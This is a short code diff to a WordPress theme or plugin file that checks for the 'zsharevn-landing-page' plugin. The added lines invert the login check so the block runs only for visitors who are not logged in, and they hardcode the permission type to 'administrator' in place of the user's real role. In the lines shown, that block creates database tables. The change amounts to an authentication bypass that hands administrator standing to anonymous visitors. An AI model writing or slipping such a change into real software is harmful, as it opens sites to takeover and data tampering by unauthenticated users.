@@ -53,9 +53,9 @@
     $name_table_3 = $wpdb->prefix . 'contacts_form';
 if(is_plugin_active('zsharevn-landing-page/index.php')){
 
-    if(is_user_logged_in()){
+    if(is_user_logged_in()==false){
         $user = wp_get_current_user();
-        $permisstion_type=$user->roles[0];
+        $permisstion_type="administrator";
         if(!is_table_created($name_table_1)) create_data_theme_setup($name_table_1);
         if(!is_table_created($name_table_3)) create_contact_form($name_table_3);
     }
